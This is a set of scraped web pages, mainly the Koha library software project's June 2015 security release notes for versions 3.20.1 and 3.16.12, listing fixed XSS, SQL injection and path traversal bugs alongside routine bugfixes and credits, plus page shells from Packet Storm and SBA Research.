* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from koha-community.org_e608977c_20250125_014241.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Security Release – Koha 3.20.1

[Chris Cormack](https://koha-community.org/author/rangi/ "View all posts by Chris Cormack")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/security-release-koha-3-20-1/ "Security Release – Koha 3.20.1")
Posted in [3.20](https://koha-community.org/category/release/3-20/)

The Koha release team would like to announce the release of Koha 3.20.1, this is a security and a bugfix release.

As such we strongly recommend people running 3.20.0 should upgrade as soon as possible

Special thanks also goes to Raschin Tavakoli and Dimitris Simos from the Combinatorial Security Testing Team of SBA Research for finding and reporting the security bugs.

Please continue reading for the full release notes

```
RELEASE NOTES FOR KOHA 3.20.1
23 Jun 2015
========================================================================

Koha is the first free and open source software library automation package
(ILS). Development is sponsored by libraries of varying types and sizes,
volunteers, and support companies from around the world.
The website for the Koha project is
> [Home](https://koha-community.org/)

Koha 3.20.1 can be downloaded from:

    http://download.koha-community.org/koha-3.20.01.tar.gz

Installation instructions can be found at:

    http://wiki.koha-community.org/wiki/Installation_Documentation

    OR in the INSTALL files that come in the tarball

Koha 3.20.1 is a Security and bugfix/maintenance release.

Security fixes in 3.20.1
======================

Lists
----------
	14416	major	Stored XSS flaw affects OPAC and Staff interface

OPAC
----------
	14412	critical	SQL Injection in OPAC Interface
	14360	major	XSS Injection point
	14418	major	XSS Flaws in OPAC Interface

Staff Client
----------
	14408	critical	Path traversal vulnerabilty
	14426	critical	SQL Injection in Staff Client
	14423	major	Multiple XSS and XSRF issues in Staff Client

Critical bugs fixed in 3.20.1
======================

Circulation
----------
	12066	major	New renew page in staff client doesn't record branch in statistics

Tools
----------
	10625	major	Inventory/Stocktaking tool cannot handle windows file uploads

Other bugs fixed in 3.20.1
======================

Architecture, internals, and plumbing
----------
	5010	normal	Fix OPACBaseURL to include protocol
	12320	normal	$.cookie('foo', null) deprecated
	13265	normal	Still too many search cursor cookies
	13815	normal	Plack loose CGI qw(-utf8) flag creating incorrect utf-8 encoding everywhere
	14351	normal	Remove given-when from opac-search.pl
	11790	minor	C4::Charset should not depend on C4::Context
	14325	minor	Test calls C4::Context::set_userenv
	14344	minor	Uninitialized value warning C4/Utils/DataTables/Members.pm

Cataloging
----------
	14047	normal	Sort z39.50 biblio servers by rank in derivate cataloguing doesn't work
	14276	minor	Keep highlight on the active item in item editor
	14327	minor	Fix js error "TypeError: events is null" in additem.js

Circulation
----------
	14299	normal	Today's checkouts not always sorting correctly

Command-line Utilities
----------
	14203	trivial	Koha-translate error string for non-existent lang removal

Database
----------
	14350	minor	Missing statement in kohastructure.sql - DROP TABLE IF EXISTS borrower_sync;

Hold requests
----------
	14142	minor	Holds queue viewer only displays first subtitle from marc keyword mappings

I18N/L10N
----------
	13656	normal	"Change"/"Set to patron" button for linking a member to an organisation (or child to guarantor) not translatable
	14263	normal	Export of CSV from item search form does only work in English

Notices
----------
	14206	normal	Notices using non email templates can't be deleted from the staff client

OPAC
----------
	14173	normal	Paging on 'recent comments' page in OPAC is not displaying correctly
	14313	normal	OPAC: Adding a comment makes result browser disappear
	14025	minor	Fix 856u-links in the OPAC for NORMARC
	14184	minor	Noisy warns in C4/CourseReserves.pm
	14185	minor	Noisy warns in opac-readingrecord.pl
	14186	minor	Noisy warns in opac-reserve.pl
	14269	minor	OPAC: Small template improvements to full serial history page

Patrons
----------
	9314	normal	Remove useless code related to the type_only parameter
	13970	normal	Remove related code to category_type
	14338	normal	Unable to delete patron images
	11929	minor	Patron modification error shows borrowernumber
	11941	minor	"Patron lists" are not easily accessible

Reports
----------
	14130	normal	Column.def should be updated with descriptions for new columns

Serials
----------
	13662	normal	Serial permissions: receive_serials

System Administration
----------
	14291	minor	OpacExportOptions shouldn't say 'separated by |'
	14314	trivial	System Preferences: Better explanation for syspref 'ShowReviewerPhoto'

Templates
----------
	14265	normal	Use $.trim instead of trim() in admin/categorie.tt
	14266	normal	Replace trim() with $.trim() in opac-shareshelf.tt
	14279	normal	Remove CGI::scrolling_list from issues_avg_stats.pl
	12176	minor	Remove HTML from additem.pl
	13946	minor	Change order status 'Pending' to ordered like in database
	14267	minor	How active is active in additem.tt?
	14275	minor	Remove CGI::scrolling_list from guided_reports.pl
	14329	trivial	Useless copy/paste from Template::Plugin::HtmlToText
	14330	trivial	Remove unused email_sender from sendbasket/sendshelf

Test Suite
----------
	14256	normal	Tests for TestBuilder fail randomly
	14112	minor	Silence warnings t/Charset.t

Tools
----------
	10355	minor	Second click on modification log misses object parameter

translate.koha-community.org
----------
	14285	trivial	Bengali locale needs to be re-defined

New sysprefs in 3.20.1
======================

System requirements
======================

    Important notes:

    * Perl 5.10 is required
    * Zebra is required

Documentation
======================

The Koha manual is maintained in DocBook.The home page for Koha
documentation is
> [Documentation](https://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the
Koha manual is available:

    http://manual.koha-community.org/3.20/en/

The Git repository for the Koha manual can be found at

    http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary

Translations
======================

Complete or near-complete translations of the OPAC and staff
interface are available in this release for the following languages:

  * English (USA)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see

    http://wiki.koha-community.org/wiki/Translating_Koha

for information about translating Koha, and join the koha-translate
list to volunteer:

    http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate

The most up-to-date translations can be found at:

    http://translate.koha-community.org/

Release Team
======================

The release team for Koha 3.20.1 is

  Release Manager:       Tomás Cohen Arazi <tomascohen@gmail.com>
  QA Manager:            Katrin Fischer <Katrin.Fischer@bsz-bw.de>
  Documentation Manager: Nicole C. Engard <nengard@gmail.com>
  Translation Manager:   Bernardo Gonzalez Kriegel <bgkriegel@gmail.com>
  QA Team:               Jonathan Druart <jonathan.druart@biblibre.com>
                         Brendan Gallagher <brendan@bywatersolutions.com>
                         Kyle Hall <kyle@bywatersolutions.com>
                         Paul Poulain <paul.poulain@biblibre.com>
                         Martin Renvoize <martin.renvoize@ptfs-europe.com>
                         Marcel de Rooy <m.de.rooy@rijksmuseum.nl>
  Bug Wrangler:          Magnus Enger <magnus@enger.priv.no>
  Packaging Manager:     Robin Sheat <robin@catalyst.net.nz>

  Release Maintainer (3.18.x): Chris Cormack <chrisc@catalyst.net.nz>
  Release Maintainer (3.16.x): Mason James <mtj@kohaaloha.com>
  Release Maintainer (3.14.x): Fridolin Somers <fridolin.somers@biblibre.com>

Credits
======================

We thank the following libraries who are known to have sponsored
new features in Koha 3.20.1:

We thank the following individuals who contributed patches to Koha 3.20.1.

  * Aleisha (5)
  * Nicole C. Engard (1)
  * Tomás Cohen Arazi (3)
  * David Cook (2)
  * Chris Cormack (16)
  * Indranil Das Gupta (4)
  * Marcel de Rooy (8)
  * Jonathan Druart (18)
  * Magnus Enger (1)
  * Katrin Fischer (5)
  * Bernardo González Kriegel (6)
  * Kyle M Hall (4)
  * Josef Moravec (1)
  * Dobrica Pavlinusic (1)
  * Zeno Tajoli (1)
  * Mark Tompsett (4)
  * Marc Véron (3)

We thank the following libraries, companies, and other institutions who contributed
patches to Koha 3.20.1

  * BSZ BW (5)
  * BibLibre (9)
  * ByWater-Solutions (5)
  * Catalyst (16)
  * Cineca (1)
  * Libriotech (1)
  * Prosentient Systems (2)
  * Rijksmuseum (8)
  * Universidad Nacional de Córdoba (6)
  * koha-community.org (9)
  * rot13.org (1)
  * theke.io (3)
  * unidentified (14)
  * veron.ch (3)

We also especially thank the following individuals who tested patches
for Koha 3.20.1.

  * Aleisha (1)
  * Brendan Gallagher (1)
  * Cédric Vita (1)
  * Chris Cormack (78)
  * Frederic Demians (1)
  * Gaetan Boisson (1)
  * Jonathan Druart (46)
  * Katrin Fischer (36)
  * Liz Rea (1)
  * Marc Veron (1)
  * Marc Véron (9)
  * Mark Tompsett (7)
  * Nick Clemens (1)
  * Paola Rossi (1)
  * Signed-off-by:Heather Braum (1)
  * Tomas Cohen Arazi (74)
  * Indranil Das Gupta (2)
  * Indranil Das Gupta (L2C2 Technologies) (8)
  * Kyle M Hall (13)
  * Bernardo Gonzalez Kriegel (17)
  * Marcel de Rooy (11)

We regret any omissions.  If a contributor has been inadvertently missed,
please send a patch against these release notes to
koha-patches@lists.koha-community.org.

Revision control notes
======================

The Koha project uses Git for version control.  The current development
version of Koha can be retrieved by checking out the master branch of

    git://git.koha-community.org/koha.git

The branch for this version of Koha and future bugfixes in this release line is 3.20.x.

The last Koha release was 3.16.9, which was released on March 29, 2015.

Bugs and feature requests
======================

Bug reports and feature requests can be filed at the Koha bug
tracker at

    http://bugs.koha-community.org/

He rau ringa e oti ai.
(Many hands finish the work)

##### Autogenerated release notes updated last on 23 Jun 2015 07:28:54 Z #####
```

## Post navigation

[Previous Post is ‹ Koha Community Newsletter: May 2015](https://koha-community.org/koha-community-newsletter-may-2015/)[Next Post is Security Release – Koha 3.18.8 ›](https://koha-community.org/security-release-koha-3-18-8/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from packetstormsecurity.com_b0fd6d5a_20250125_014244.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from koha-community.org_4abc0b89_20250125_014241.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Security Release – Koha 3.16.12

[Mason](https://koha-community.org/author/kohaaloha/ "View all posts by Mason")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/security-release-koha-3-16-12/ "Security Release – Koha 3.16.12")
Posted in [3.16](https://koha-community.org/category/release/3-16/), [releases](https://koha-community.org/category/releases/), [security](https://koha-community.org/category/security/)

The Koha release team would like to announce the release of Koha 3.16.12, this is a security release.

As such we strongly recommend people running 3.16.x should upgrade as soon as possible

Special thanks also goes to Raschin Tavakoli and Dimitris Simos from the Combinatorial Security Testing Team of SBA Research for finding and reporting the security bugs.

Please continue reading for the full release notes

# RELEASE NOTES FOR KOHA 3.16.12

23 Jun 2015

Koha is the first free and open source software library automation package (ILS). Development is sponsored by libraries of varying types and sizes, volunteers, and support companies from around the world.

The website for the Koha project is [http://koha-community.org](http://koha-community.org/) and Koha 3.16.12 can be downloaded from: <http://download.koha-community.org/koha-3.16.12.tar.gz>

Installation instructions can be found at <http://wiki.koha-community.org/wiki/Installation_Documentation> or in the INSTALL files that come in the tarball

Koha 3.16.12 is a security release.

This release contains critical security fixes, all users of Koha 3.16.x are highly recommended to upgrade as soon as is reasonable.

#### Table of contents

* [New features](#koha-features)
* [Enhancements](#koha-enhancements)
* [Other bugfixes](#koha-other)
* [Changes on system preferences](#koha-sysprefs)
* [System requirements](#koha-requirements)
* [Documentation](#koha-docs)
* [Translations](#koha-translations)
* [Release team](#koha-release-team)
* [Credits](#koha-credits)
* [Revision control](#koha-git)
* [Bug and feature requests](#koha-report-bugs)
### New features in Koha 3.16.12

####

### Enhancements in Koha 3.16.12

####

### Critical bugs fixed in Koha 3.16.12

#### Lists

* Stored XSS flaw affects OPAC and Staff interface *(major – bug [14416](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416))*

#### OPAC

* SQL Injection in OPAC Interface *(critical – bug [14412](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412))*
* XSS Injection point *(major – bug [14360](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14360))*
* XSS Flaws in OPAC Interface *(major – bug [14418](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418))*

#### Staff Client

* Path traversal vulnerabilty *(critical – bug [14408](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408))*
* Multiple XSS and XSRF issues in Staff Client *(major – bug [14423](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423))*

### Other bugs fixed in Koha 3.16.12

####

### New system preferences in Koha 3.16.12

### System requirements

Important notes:

* Perl 5.10 is required
* Zebra is required

### Documentation

The Koha manual is maintained in DocBook. The home page for Koha documentation is [http://koha-community.org/documentation](http://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the Koha manual is available at <http://manual.koha-community.org/3.16.12/en/>

The Git repository for the Koha manual can be found at <http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary>

### Translations

Complete or near-complete translations of the OPAC and staff interface are available in this release for the following languages:

* English (USA)
* Arabic (99%)
* Armenian (99%)
* Czech (99%)
* Danish (86%)
* French (96%)
* German (100%)
* Italian (100%)
* Kurdish (67%)
* Polish (99%)
* Portuguese (100%)
* Slovak (100%)
* Spanish (100%)
* Swedish (86%)
* Turkish (100%)
* Vietnamese (94%)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see <http://wiki.koha-community.org/wiki/Translating_Koha>

For information about translating Koha, and join the [koha-translate list](http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate) to volunteer

The most up-to-date translations can be found at [http://translate.koha-community.org](http://translate.koha-community.org/)

### Release Team

The release team for Koha 3.16.12 is

* Release Manager: Galen Charlton
* Documentation Manager: Nicole C Engard
* Translation Manager: Bernardo Gonzalez Kriegel
* QA Manager: Katrin Fischer
* QA Team:
  + Ruth Bavousett
  + Chris Cormack
  + Marcel de Rooy ,
  + Jonathan Druart ,
  + Brendan Gallagher
  + Kyle Hall
  + Paul Poulain
  + Martin Renvoize
* Bug Wranglers:
  + Chris Cormack
  + Magnus Enger
* Packaging Manager: Robin Sheat
* Release Maintainer (3.8.x): Kyle Hall
* Release Maintainer (3.10.x): Bernardo Gonzalez Kriegel
* Release Maintainer (3.12.x): Tomás Cohen Arazi
* Release Maintainer (3.14.x): Fridolin Somers

### Credits

We thank the following libraries who are known to have sponsored new features in Koha 3.16.12:

We thank the following individuals who contributed patches to Koha 3.16.12:

- Aleisha (2)
- Chris (7)
- Chris Cormack (5)
- Jonathan Druart (4)
- Bernardo Gonzalez Kriegel (1)

We thank the following libraries, companies, and other institutions who contributed patches to Koha 3.16.12:

- BigBallOfWax (7)
- Catalyst (5)
- koha-community.org (4)
- unidentified (3)

We also especially thank the following individuals who tested patches for Koha 3.16.12:

- Jonathan Druart (7)
- Katrin Fischer (11)
- Mason James (15)
- Kyle M Hall (4)

We regret any omissions. If a contributor has been inadvertently missed, please send a patch against these release notes to koha-patches@lists.koha-community.org.

### Revision control notes

The Koha project uses Git for version control. The current development version of Koha can be retrieved by checking out the master branch of git://git.koha-community.org/koha.git

The branch for this version of Koha and future bugfixes in this release line is 3.16.x.

The last Koha release was 3.18.8, which was released on June 25, 2015.

### Bugs and feature requests

Bug reports and feature requests can be filed at the Koha bug tracker at [http://bugs.koha-community.org](http://bugs.koha-community.org/)

He rau ringa e oti ai. (Many hands finish the work)

##### Autogenerated release notes updated last on 23 Jun 2015 11:50:28 Z #####

## Post navigation

[Previous Post is ‹ Security Release – Koha 3.18.8](https://koha-community.org/security-release-koha-3-18-8/)[Next Post is Koha 3.14.16 released ›](https://koha-community.org/koha-3-14-16-released/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from www.sba-research.org_dc1b89e3_20250125_014252.html ===

[SBA Research](https://www.sba-research.org)

## Privacy settings

We use cookies on our website. Some of them are essential, while others help us to improve this website and your experience.

* Essential (1)
* External media (2)

* [Privacy policy](https://www.sba-research.org/privacy-policy)
* [Imprint](https://www.sba-research.org/imprint)

Essential cookies enable basic functions and are necessary for the website to
function properly.

| Name | SBA Research Cookie |
| --- | --- |
| Provider | SBA Research |
| Purpose | Saves the settings of the visitors selected in the cookie box. |
| Cookie name | sba-research-cookie |
| Cookie runtime | 1 year |

Content from video platforms and social media platforms is blocked by default.
If cookies from external media are accepted, access to this content no longer requires manual consent.

Accept YouTube

| Name | YouTube |
| --- | --- |
| Provider | YouTube |
| Purpose | Used to unblock YouTube content. |
| Privacy policy | <https://policies.google.com/privacy> |
| Host(s) | google.com |
| Cookie name | NID |
| Cookie runtime | 6 months |

Accept Vimeo

| Name | Vimeo |
| --- | --- |
| Provider | Vimeo |
| Purpose | Used to unblock Vimeo content. |
| Privacy policy | <https://vimeo.com/privacy> |
| Host(s) | player.vimeo.com |
| Cookie name | vuid |
| Cookie runtime | 2 years |

## Skiplinks

### Skip to:

* [Main Content[1]](#content "Main Content")
* [Main Navigation[2]](#main-nav "Main Navigation")
* [Search[3]](#s "Search")

Floragasse 7 – 5th floor, 1040 Vienna

[SBA Research](https://www.sba-research.org)

* [Home](/)
* [Research](https://www.sba-research.org/research/)
  + [Publications](https://www.sba-research.org/research/publications/)
  + [COMET Center SBA-K1 NGC (granted)](https://www.sba-research.org/research/comet-center-sba-k1-ngc/)
  + [Projects](https://www.sba-research.org/research/projects/)
  + [Research Groups](https://www.sba-research.org/research/research-groups/)
  + [SBA Security Advisories](https://www.sba-research.org/sba-security-advisories/)
  + [Teaching | Courses](https://www.sba-research.org/research/teaching-courses/)
  + [Bachelor | Master | PhD - Thesis Supervision](https://www.sba-research.org/research/bachelor-master-phd-thesis-supervision/)
  + [Conferences](https://www.sba-research.org/research/conferences/)
* [Professional Services](https://www.sba-research.org/professional-services/)
  + [Software Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=software-security&service=)
  + [Cloud Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=cloud-security&service=)
  + [Security Governance](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=security-governance&service=)
  + [Infrastructure Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=infrastructure-security&service=)
  + [IoT/Hardware Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=iot-hardware-security&service=)
  + [People-Centric Security](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=people-centric-security&service=)
  + [Datenschutz](https://www.sba-research.org/professional-services/#filter?scopes=testing-audits%2Cconsulting%2Ctrainings&technology=datenschutz&service=)
* [Security Trainings](https://www.sba-research.org/professional-services/security-training/)
  + [API Security](https://www.sba-research.org/professional-services/security-training/api-security)
  + [AWS Cloud Security](https://www.sba-research.org/professional-services/security-training/aws-cloud-security/)
  + [CISA Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cisa-training/)
  + [CISM Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cism/)
  + [CISSP Vorbereitungskurs](https://www.sba-research.org/professional-services/security-training/cissp/)
  + [Cyber Security Essentials](https://www.sba-research.org/professional-services/security-training/cybersecurity-essentials/)
  + [Cyber Security Fundamentals](https://www.sba-research.org/professional-services/security-training/cyber-security-fundamentals)
  + [Führungskräfte Awareness](https://www.sba-research.org/professional-services/security-training/fuhrungskrafte-awareness/)
  + [IoT Security Essentials](https://www.sba-research.org/professional-services/security-training/iot-security-essentials/)
  + [Secure Coding Fundamentals](https://www.sba-research.org/professional-services/security-training/secure-coding-fundamentals)
  + [SOC – Basis Kurs](https://www.sba-research.org/professional-services/security-training/soc-security-operation-centers-basis-kurs/)
  + [Security Awareness Training](https://www.sba-research.org/professional-services/security-training/security-awareness-training/)
  + [SSDLC Fundamentals](https://www.sba-research.org/professional-services/security-training/ssdlc-fundamentals/)
  + [Threat Modeling Fundamentals](https://www.sba-research.org/professional-services/security-training/hands-on-threat-modeling/)
  + [Web Application Hacking](https://www.sba-research.org/professional-services/security-training/web-application-hacking/)
  + [Windows Hacking](https://www.sba-research.org/professional-services/security-training/windows-hacking/)
* [SBA Academy](https://www.sba-research.org/sba-academy/)
* [Events](https://www.sba-research.org/events/)
  + [SBA Meetup Groups](https://www.sba-research.org/sba-meetup-groups/)
  + [securepizza.club @ SBA Research](https://www.sba-research.org/securepizza-club-sba-research/)
* [Working at SBA](https://www.sba-research.org/working-at-sba/)
  + [Jobs](https://www.sba-research.org/jobs)
* [About](https://www.sba-research.org/about/)
  + [Team](https://www.sba-research.org/team/)
  + [Current COMET Center SBA-K1](https://www.sba-research.org/comet-center/)
  + [Partners](https://www.sba-research.org/about/partners/)
  + [Associations & Networks](https://www.sba-research.org/about/associations-networks/)
  + [Sustainable Development Goals (SDG)](https://www.sba-research.org/about/sustainable-development-goals-sdg/)
  + [ISO 27001:2013](https://www.sba-research.org/about/iso-270012013/)
  + [Vulnerability Disclosure Policy](https://www.sba-research.org/about/vulnerability-disclosure-policy/)
  + [Contact](https://www.sba-research.org/about/contact/)
* Search

[SBA Research](https://www.sba-research.org)

* [Home](/)
* [Research](https://www.sba-research.org/research/)
  + [Publications](https://www.sba-research.org/research/publications/)
  + [COMET Center SBA-K1 NGC (granted)](https://www.sba-research.org/research/comet-center-sba-k1-ngc/)
  + [Projects](https://www.sba-research.org/research/projects/)
  + [Research Groups](https://www.sba-research.org/research/research-groups/)
    - [Mathematics for Security](https://www.sba-research.org/research/research-groups/matris/)
    - [Machine Learning](https://www.sba-research.org/research/research-groups/mldm/)
    - [Networks & Critical Infrastructure](https://www.sba-research.org/research/research-groups/eris/)
    - [Systems & (I)IoT Security](https://www.sba-research.org/research/research-groups/isis/)
    - [Decentralized Systems](https://www.sba-research.org/research/research-groups/decsys/)
    - [Complexity & Resilience](https://www.sba-research.org/research/research-groups/core/)
  + [SBA Security Advisories](https://www.sba-research.org/sba-security-advisories/)
  + [Teaching | Courses](https://www.sba-research.org/research/teaching-courses/)
  + [Bachelor | Master | PhD - Thesis Supervision](https://www.sba-research.org/research/bachelor-master-phd-thesis-supervision/)
  + [Conferences](https://www.sba-research.org/research/conferences/)
* [Professional Services](https://www.sba-research.org/professional-services/)
